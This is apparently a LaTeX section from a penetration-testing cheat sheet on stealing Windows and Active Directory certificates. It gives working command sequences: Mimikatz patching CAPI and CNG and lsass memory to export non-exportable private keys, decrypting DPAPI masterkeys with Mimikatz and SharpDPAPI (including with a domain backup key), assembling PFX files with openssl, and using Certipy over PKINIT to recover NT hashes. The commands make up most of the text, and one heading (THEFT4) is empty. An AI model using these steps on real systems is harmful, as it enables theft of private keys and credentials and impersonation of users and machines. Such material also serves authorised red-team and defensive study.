\section{Theft attacks}

\subsection{THEFT1: Exporting Certificates Using the Crypto APIs}

\subsubsection{CertStealer (windows)}

\href{https://github.com/TheWover/CertStealer}{CertStealer}

\subsubsection{Mimikatz}

If the private key is non-exportable, CAPI and CNG will not allow extraction of
non-exportable certificates. Mimikatz’s \verb+crypto::capi+ and
\verb+crypto::cng+ commands can patch the CAPI and CNG to allow exportation of
private keys. \verb+crypto::capi+ patches CAPI in the current process whereas
\verb+crypto::cng+ requires patching lsass.exe’s memory

\begin{verbatim}
crypto::capi
crypto::certificates /export
\end{verbatim}


\subsection{THEFT2: User Certificate Theft via DPAPI}
Windows stores certificate private keys using DPAPI.

Windows stores user :
\begin{itemize}
    \item certificates in the registry:
        \begin{itemize}
            \item \verb+HKEY_CURRENT_USER\SOFTWARE\Microsoft\SystemCertificates+
            \item or \verb+%APPDATA%\Microsoft\SystemCertificates\My\Certificates\+
        \end{itemize}
    \item private key:
        \begin{itemize}
            \item \verb+%APPDATA%\Microsoft\Crypto\RSA\User SID\+ for
            \verb+CAPI+ keys
        \item \verb+%APPDATA%\Microsoft\Crypto\Keys\+ for CNG keys
        \end{itemize}
\end{itemize}

To obtain a certificate and its associated private key, one needs to:
\begin{enumerate}
    \item Identify which certificate one wants to steal and extract the key
        store name
    \item Find the DPAPI masterkey needed to decrypt the associated private key
    \item Obtain the plaintext DPAPI masterkey and use it to decrypt the
        private key
\end{enumerate}

\subsubsection{Mimikatz}
\begin{verbatim}
#Export certificate and its public key to DER
cd C:\users\user1\appdata\roaming\microsoft\systemcertificates\my\certificates\
./mimikatz.exe "crypto::system /file:43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8 /export"

#Find the master key (test them all until you find the good one)
./mimikatz.exe "dpapi::capi /in:ed6c2461ca931510fc7d336208cb40b5_cd42b893-122c-49c3-85da-c5fff1b0a3ad"

#Decrypt the master key
./mimikatz.exe "dpapi::masterkey /in:f216eabc-73af-45dc-936b-babe7ca8ed05 /rpc" exit

#Decrypt the private key
./mimikatz.exe "dpapi::capi /in:\"Crypto\RSA\<user_SID>\ed6c2461ca931510fc7d336208cb40b5_cd42b893-122c-49c3-85da-c5fff1b0a3ad\" /masterkey:81a2357b28e004f3df2f7c29588fbd8d650f5e70" exit

#Build PFX certificate
openssl x509 -inform DER -outform PEM -in 43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8.der -out public.pem
openssl rsa -inform PVK -outform PEM -in dpapi_private_key.pvk -out private.pem
openssl pkcs12 -in public.pem -inkey private.pem -password pass:bar -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
\end{verbatim}

\subsubsection{SharpDPAPI}
To simplify masterkey file and private key file decryption, SharpDPAPI’s
\verb+certificates+ command can be used with the \verb+/pvk+, \verb+/mkfile+,
\verb+/password+, or \verb+{GUID}:KEY+ arguments to decrypt the private keys
and associated certificates, outputting a .pem text file

\begin{verbatim}

SharpDPAPI.exe certificates /mkfile:key.txt

# With a domain backup key to first decrypt all possible master keys
SharpDPAPI.exe certificates /pvk:key.pvk

openssl pkcs12 -in cert.pem -keyex 
    -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
\end{verbatim}

\subsection{THEFT3: Machine Certificate Theft via DPAPI}

\begin{verbatim}
SharpDPAPI.exe certificates /machine
\end{verbatim}

\subsection{THEFT4: Finding Certificates Files}
\subsection{THEFT5: NTLM Creds via PKINIT}

\begin{verbatim}
# Authenticate and recover the NT hash
certipy auth -pfx 'user.pfx' -no-save
\end{verbatim}

